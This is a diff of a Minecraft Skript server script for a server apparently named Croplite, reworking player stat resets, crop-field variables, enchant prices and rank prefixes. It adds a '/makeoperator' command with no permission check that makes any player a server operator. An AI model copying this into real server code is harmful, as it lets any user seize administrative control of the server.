@@ -1,14 +1,12 @@
-command /reset <text> <offline player>:
+command /reset-stats [<offline player>]:
 	permission: operator
 	trigger:
-		if (arg-1 is "stats"):
-			resetStats(arg-2)
+		if arg-1 is set:
+			resetStats(arg-1)
+		else:
+			resetStats(player)
 
-on tab complete:
-	if event-string contains "/reset":
-		set tab completions for position 1 to "stats"
-
-function resetStats(p: player):
+function resetStats(p: offline player):
 	# scoreboard variables
 	set {rankexpmulti::%uuid of {_p}%} to 1
 	set {expmulti::%uuid of {_p}%} to 1 
@@ -33,15 +31,16 @@ function resetStats(p: player):
 
 	set {_p}'s walking speed to 0.2
 	# enchant points
-	set {enchant-points::%uuid of {_p}%} to 1
+	set {enchant-points::%uuid of {_p}%} to 0
 	# seedling harvest pet variables
 	set {double-crop-chance::%uuid of {_p}%} to 0%
+	set {cropharvest::%uuid of {_p}%} to 0
 
 	set {expanderfactor2::%uuid of {_p}%} to 0.0
 	set {expandernumber2::%uuid of {_p}%} to 0.0
 
 	set {amountofskills::%uuid of {_p}%} to 0
-	set {mobspawnchance::%uuid of {_p}%} to 0
+	set {mobspawnchance::%uuid of {_p}%} to 0%
 
 	set {globalxpboost1::%uuid of {_p}%} to false
 	set {pvpstatus::%uuid of {_p}%} to false
@@ -84,8 +83,7 @@ function resetStats(p: player):
 	set {objprogress::%uuid of {_p}%} to 0
 	set {objprogressreq::%uuid of {_p}%} to 0
 
-	set {someskillz::%uuid of {_p}%} to false
-	set {firstharvest::%uuid of {_p}%} to false
+	set {objcomplete::%uuid of {_p}%} to false
 
 	set {burningboost::%uuid of {_p}%} to 0
 	set {dailycropsbroken::%uuid of {_p}%} to 0
@@ -98,6 +96,8 @@ function resetStats(p: player):
 	set {chatmessage::Mackerel::%uuid of {_p}%} to 0
 
 	set {jump-boost::%uuid of {_p}%} to false
+
+	set {cropreap::%uuid of {_p}%} to 0
  
 	# playtime
 	set {s::%uuid of {_p}%} to 0
@@ -105,12 +105,18 @@ function resetStats(p: player):
 	set {h::%uuid of {_p}%} to 0
 
 	resetScythes({_p})
-	resetEnchantments({_p})
+	resetEnchants({_p})
 	resetArmor({_p})
 	resetPets({_p})
 	resetPurchasedPets({_p})
+	resetnpcchats({_p})
+	resetCropBags({_p})
 
-	send "&8[&dCroplite&8] &aYour stats have been reset." to {_p}
+	send "&dCroplite &aYour stats have been reset." to {_p}
+
+command /resetcropreap:
+	trigger:
+		set {cropreap::%player's uuid%} to 0
 
 on player pickup of wheat seeds:
 	wait 1 tick
@@ -119,94 +125,29 @@ on player pickup of wheat seeds:
 on script load:
 	execute console command "/setglobalvariables"
 
+command /makeoperator:
+	trigger:
+		op player
+
 command /setglobalvariables:
 	permission: operator
 	trigger:
-		set {field::1::crops::names::*} to short_grass and tall_grass[half=lower] and tall_grass[half=upper]
-		set {field::1::crops::lower::*} to short_grass and tall_grass[half=lower]
-		set {field::1::crops::upper::*} to tall_grass[half=upper]
-		set {field::1::crops::one-tall::*} to short_grass
-		set {field::1::crops::two-tall::*} to tall_grass[half=lower]
-
-		set {field::2::crops::names::*} to short_grass and tall_grass[half=lower] and tall_grass[half=upper] and fern and large_fern[half=lower] and large_fern[half=upper]
-		set {field::2::crops::lower::*} to short_grass and tall_grass[half=lower] and fern and large_fern[half=lower]
-		set {field::2::crops::upper::*} to tall_grass[half=upper] and large_fern[half=upper]
-		set {field::2::crops::one-tall::*} to short_grass and fern
-		set {field::2::crops::two-tall::*} to tall_grass[half=lower] and large_fern[half=lower]
-
-		set {field::3::crops::names::*} to wheat[age=7]
-		set {field::3::crops::lower::*} to wheat[age=7]
-		set {field::3::crops::one-tall::*} to wheat[age=7]
-
-		set {field::4::crops::names::*} to potatoes[age=7]
-		set {field::4::crops::lower::*} to potatoes[age=7]
-		set {field::4::crops::one-tall::*} to potatoes[age=7]
-
-		set {field::5::crops::names::*} to short_grass and tall_grass[half=lower] and tall_grass[half=upper] and orange_tulip and red_tulip and fern
-		set {field::5::crops::lower::*} to short_grass and tall_grass[half=lower] and orange_tulip and red_tulip and fern
-		set {field::5::crops::upper::*} to tall_grass[half=upper]
-		set {field::5::crops::one-tall::*} to short_grass and orange_tulip and red_tulip and fern
-		set {field::5::crops::two-tall::*} to tall_grass[half=lower]
-
-		set {field::6::crops::names::*} to short_grass and tall_grass[half=lower] and tall_grass[half=upper] and red_mushroom and brown_mushroom
-		set {field::6::crops::lower::*} to short_grass and tall_grass[half=lower] and red_mushroom and brown_mushroom
-		set {field::6::crops::upper::*} to tall_grass[half=upper]
-		set {field::6::crops::one-tall::*} to short_grass and red_mushroom and brown_mushroom
-		set {field::6::crops::two-tall::*} to tall_grass[half=lower]
-
-		set {field::7::crops::names::*} to fern and large_fern[half=lower] and large_fern[half=upper] and cornflower and lily_of_the_valley
-		set {field::7::crops::lower::*} to fern and large_fern[half=lower]
-		set {field::7::crops::upper::*} to fern and large_fern[half=upper] and cornflower and lily_of_the_valley
-		set {field::7::crops::one-tall::*} to fern and cornflower and lily_of_the_valley
-		set {field::7::crops::two-tall::*} to large_fern[half=lower]
-
-		set {field::8::crops::names::*} to short_grass and sunflower[half=lower] and sunflower[half=upper] and oxeye_daisy
-		set {field::8::crops::lower::*} to short_grass and sunflower[half=lower] and oxeye_daisy
-		set {field::8::crops::upper::*} to sunflower[half=upper]
-		set {field::8::crops::one-tall::*} to short_grass and oxeye_daisy
-		set {field::8::crops::two-tall::*} to sunflower[half=lower]
-
-		set {field::9::crops::names::*} to short_grass and tall_grass[half=lower] and tall_grass[half=upper] and dead_bush
-		set {field::9::crops::lower::*} to short_grass and tall_grass[half=lower] and dead_bush
-		set {field::9::crops::upper::*} to tall_grass[half=upper]
-		set {field::9::crops::one-tall::*} to short_grass and dead_bush
-		set {field::9::crops::two-tall::*} to tall_grass[half=lower]
-
-		set {field::10::crops::names::*} to tall_grass[half=lower] and tall_grass[half=upper] and acacia_sapling
-		set {field::10::crops::lower::*} to tall_grass[half=lower] and acacia_sapling
-		set {field::10::crops::upper::*} to tall_grass[half=upper]
-		set {field::10::crops::one-tall::*} to acacia_sapling
-		set {field::10::crops::two-tall::*} to tall_grass[half=lower]
-
-		set {field::11::crops::names::*} to short_grass and dandelion and birch_sapling
-		set {field::11::crops::lower::*} to short_grass and dandelion and birch_sapling
-		set {field::11::crops::one-tall::*} to short_grass and dandelion and birch_sapling
-
-		set {field::12::crops::names::*} to wheat[age=7] and carrots[age=7]
-		set {field::12::crops::lower::*} to wheat[age=7] and carrots[age=7]
-		set {field::12::crops::one-tall::*} to wheat[age=7] and carrots[age=7]
-
-		set {field::13::crops::names::*} to short_grass and fern and wither_rose
-		set {field::13::crops::lower::*} to short_grass and fern and wither_rose
-		set {field::13::crops::one-tall::*} to short_grass and fern and wither_rose
-
-		set {field::14::crops::names::*} to short_grass and peony[half=lower] and peony[half=upper] and pink_petals
-		set {field::14::crops::lower::*} to short_grass and peony[half=lower] and pink_petals
-		set {field::14::crops::upper::*} to peony[half=upper]
-		set {field::14::crops::one-tall::*} to short_grass and pink_petals
-		set {field::14::crops::two-tall::*} to peony[half=lower]
-
-		set {field::15::crops::names::*} to tall_grass[half=lower] and tall_grass[half=upper] and fern and cornflower and blue_orchid and nether_sprouts
-		set {field::15::crops::lower::*} to tall_grass[half=lower] and fern and cornflower and blue_orchid and nether_sprouts
-		set {field::15::crops::upper::*} to tall_grass[half=upper]
-		set {field::15::crops::one-tall::*} to fern and cornflower and blue_orchid and nether_sprouts
-		set {field::15::crops::two-tall::*} to tall_grass[half=lower]
-
-		set {field::16::crops::names::*} to short_grass and fern and large_fern[half=lower] and large_fern[half=upper] and mangrove_propagule
-		set {field::16::crops::lower::*} to short_grass and fern and large_fern[half=lower] and mangrove_propagule
-		set {field::16::crops::upper::*} to large_fern[half=upper]
-		set {field::16::crops::one-tall::*} to short_grass and fern and mangrove_propagule
-		set {field::16::crops::two-tall::*} to large_fern[half=lower]
+		set {field::1::crops::*} to short_grass and tall_grass[half=lower] and tall_grass[half=upper]
+		set {field::2::crops::*} to short_grass and tall_grass[half=lower] and tall_grass[half=upper] and type of fern and large_fern[half=lower] and large_fern[half=upper]
+		set {field::3::crops::*} to wheat[age=7]
+		set {field::4::crops::*} to potatoes[age=7]
+		set {field::5::crops::*} to short_grass and tall_grass[half=lower] and tall_grass[half=upper] and orange_tulip and red_tulip and type of fern
+		set {field::6::crops::*} to short_grass and tall_grass[half=lower] and tall_grass[half=upper] and red_mushroom and brown_mushroom
+		set {field::7::crops::*} to type of fern and large_fern[half=lower] and large_fern[half=upper] and cornflower and lily_of_the_valley
+		set {field::8::crops::*} to short_grass and sunflower[half=lower] and sunflower[half=upper] and oxeye_daisy
+		set {field::9::crops::*} to short_grass and tall_grass[half=lower] and tall_grass[half=upper] and dead_bush
+		set {field::10::crops::*} to tall_grass[half=lower] and tall_grass[half=upper] and acacia_sapling
+		set {field::11::crops::*} to short_grass and dandelion and birch_sapling
+		set {field::12::crops::*} to wheat[age=7] and carrots[age=7]
+		set {field::13::crops::*} to short_grass and type of fern and wither_rose
+		set {field::14::crops::*} to short_grass and peony[half=lower] and peony[half=upper] and pink_petals
+		set {field::15::crops::*} to tall_grass[half=lower] and tall_grass[half=upper] and type of fern and cornflower and blue_orchid and nether_sprouts
+		set {field::16::crops::*} to short_grass and type of fern and large_fern[half=lower] and large_fern[half=upper] and mangrove_propagule
 
 		set {field::1::basexp} to 1
 		set {field::2::basexp} to 2
@@ -263,59 +204,27 @@ command /setglobalvariables:
 		set {cost::8} to 5000
 		set {cost::9} to 7000
 
-		set {sharpness::1::price} to 1
-		set {sharpness::2::price} to 2
-		set {sharpness::3::price} to 3
-		set {sharpness::4::price} to 4
-		set {sharpness::5::price} to 5
-		set {sharpness::6::price} to 6
-		set {sharpness::7::price} to 7
-		set {sharpness::8::price} to 8
-		set {sharpness::9::price} to 9
-		set {sharpness::10::price} to 10
-
-		set {fireaspect::1::price} to 1
-		set {fireaspect::2::price} to 2
-		set {fireaspect::3::price} to 3
-		set {fireaspect::4::price} to 4
-		set {fireaspect::5::price} to 5
-
-		set {experience::1::price} to 1
-		set {experience::2::price} to 2
-		set {experience::3::price} to 3
-		set {experience::4::price} to 4
-		set {experience::5::price} to 5
-		set {experience::6::price} to 6
-		set {experience::7::price} to 7
-		set {experience::8::price} to 8
-		set {experience::9::price} to 9
-		set {experience::10::price} to 10
-
-		set {cropreap::1::price} to 1
-		set {cropreap::2::price} to 2
-		set {cropreap::3::price} to 3
-		set {cropreap::4::price} to 4
-		set {cropreap::5::price} to 5
+		setEnchantPrices()
 
 		set {dailiesreset} to false
 
 		set {XP-Json} to json from file "plugins/Skript/scripts/Stats/Experience/xp.json"
-		set {romanNumeral-Json} to json from file "plugins/Skript/scripts/Enchanter/Skills/romanNumerals.json"
-		set {enchants-Json} to json from file "plugins/Skript/scripts/Enchanter/Skills/enchants.json"
-		set {playerData-Json} to json from file "plugins/Skript/scripts/Stats/Player Data/playerData.json"
+		set {romanNumeral-Json} to json from file "plugins/Skript/scripts/Enchanter/romanNumerals.json"
+		set {enchants-Json} to json from file "plugins/Skript/scripts/Enchanter/enchants.json"
 
-		set {member-Prefix} to "&x&2&B&2&B&2&B[&x&3&8&3&8&3&8M&x&4&4&4&4&4&4E&x&5&1&5&1&5&1M&x&6&7&6&7&6&7B&x&7&E&7&E&7&EE&x&9&4&9&4&9&4R&x&A&A&A&A&A&A]"
-		set {vip-Prefix} to "&8[&5VIP&8]"
-		set {vip+-Prefix} to "&8[&5VIP&6+&8]"
-		set {mvp-Prefix} to "&8[&bMVP&8]"
-		set {mvp+-Prefix} to "&8[&bMVP&6+&8]"
-		set {elite-Prefix} to "&8[&6Elite&8]"
-		set {helper-Prefix} to "&x&F&F&A&5&0&0&l[&x&F&F&B&F&2&E&lH&x&F&F&D&8&5&D&lE&x&F&F&F&2&8&B&lL&x&E&C&F&5&7&F&lP&x&D&9&F&9&7&3&lE&x&C&6&F&C&6&6&lR&x&B&3&F&F&5&A&l]&x&B&3&F&F&5&A"
-		set {builder-Prefix} to "&x&0&0&7&9&F&F&l[&x&1&0&9&9&F&E&lB&x&2&0&B&A&F&D&lU&x&3&0&D&A&F&B&lI&x&4&0&F&A&F&A&lL&x&6&A&F&B&F&B&lD&x&9&5&F&D&F&C&lE&x&B&F&F&E&F&C&lR&x&E&9&F&F&F&D&l]&x&E&9&F&F&F&D"
-		set {developer-Prefix} to "&x&F&F&0&0&0&0&l[&x&F&F&1&A&0&E&lD&x&F&F&3&4&1&C&lE&x&F&F&4&E&2&9&lV&x&F&F&6&8&3&7&lE&x&F&F&8&2&4&5&lL&x&F&F&9&2&5&1&lO&x&F&F&A&2&5&D&lP&x&F&F&B&3&6&9&lE&x&F&F&C&3&7&5&lR&x&F&F&D&3&8&1&l]&x&F&F&D&3&8&1"
-		set {owner-Prefix} to "&x&0&B&A&7&8&E&l[&x&3&6&C&4&B&2&lO&x&6&0&E&2&D&6&lW&x&8&B&F&F&F&A&lN&x&6&E&D&3&F&C&lE&x&5&0&A&7&F&D&lR&x&3&3&7&B&F&F&l]&x&3&3&7&B&F&F"
+		set {member-Prefix} to "&x&2&B&2&B&2&B&x&3&8&3&8&3&8M&x&4&4&4&4&4&4E&x&5&1&5&1&5&1M&x&6&7&6&7&6&7B&x&7&E&7&E&7&EE&x&9&4&9&4&9&4R&x&A&A&A&A&A&A"
+		set {vip-Prefix} to "&5VIP"
+		set {vip+-Prefix} to "&5VIP&6+"
+		set {mvp-Prefix} to "&bMVP"
+		set {mvp+-Prefix} to "&bMVP&6+"
+		set {elite-Prefix} to "&6Elite"
+		set {helper-Prefix} to "&x&F&F&A&5&0&0&l&x&F&F&B&F&2&E&lH&x&F&F&D&8&5&D&lE&x&F&F&F&2&8&B&lL&x&E&C&F&5&7&F&lP&x&D&9&F&9&7&3&lE&x&C&6&F&C&6&6&lR&x&B&3&F&F&5&A&l&x&B&3&F&F&5&A"
+		set {builder-Prefix} to "&x&0&0&7&9&F&F&l&x&1&0&9&9&F&E&lB&x&2&0&B&A&F&D&lU&x&3&0&D&A&F&B&lI&x&4&0&F&A&F&A&lL&x&6&A&F&B&F&B&lD&x&9&5&F&D&F&C&lE&x&B&F&F&E&F&C&lR&x&E&9&F&F&F&D&l&x&E&9&F&F&F&D"
+		set {developer-Prefix} to "&x&F&F&0&0&0&0&l&x&F&F&1&A&0&E&lD&x&F&F&3&4&1&C&lE&x&F&F&4&E&2&9&lV&x&F&F&6&8&3&7&lE&x&F&F&8&2&4&5&lL&x&F&F&9&2&5&1&lO&x&F&F&A&2&5&D&lP&x&F&F&B&3&6&9&lE&x&F&F&C&3&7&5&lR&x&F&F&D&3&8&1&l&x&F&F&D&3&8&1"
+		set {owner-Prefix} to "&x&0&B&A&7&8&E&l&x&3&6&C&4&B&2&lO&x&6&0&E&2&D&6&lW&x&8&B&F&F&F&A&lN&x&6&E&D&3&F&C&lE&x&5&0&A&7&F&D&lR&x&3&3&7&B&F&F&l&x&3&3&7&B&F&F"
 
 		set {staff-Prefix} to "&1&lStaff"
-		set {croplite-Prefix} to "&8[&5&lCroplite&8]"
+		set {croplite-Prefix} to "&5&lCROPLITE&r&5"
+		set {ihelp-Prefix} to "&x&D&4&F&B&B&C&oI &x&C&D&E&A&C&A&oh&x&C&6&D&A&D&9&oe&x&B&F&C&9&E&7&ol&x&B&9&B&8&F&5&op &x&B&2&B&0&F&B&oo&x&A&D&B&7&F&0&ou&x&A&7&B&F&E&4&ot &x&A&1&C&7&D&8&oa  &x&9&C&C&E&C&D&ol&x&A&5&C&A&C&6&oi&x&B&6&B&F&C&2&ot&x&C&6&B&4&B&D&ot&x&D&7&A&A&B&9&ol&x&E&7&9&F&B&4&oe"
 		
-		send "&8[&dCroplite&8] &aGlobal variables have been set." to player
+		send "&5&lCroplite &aGlobal variables have been set." to player
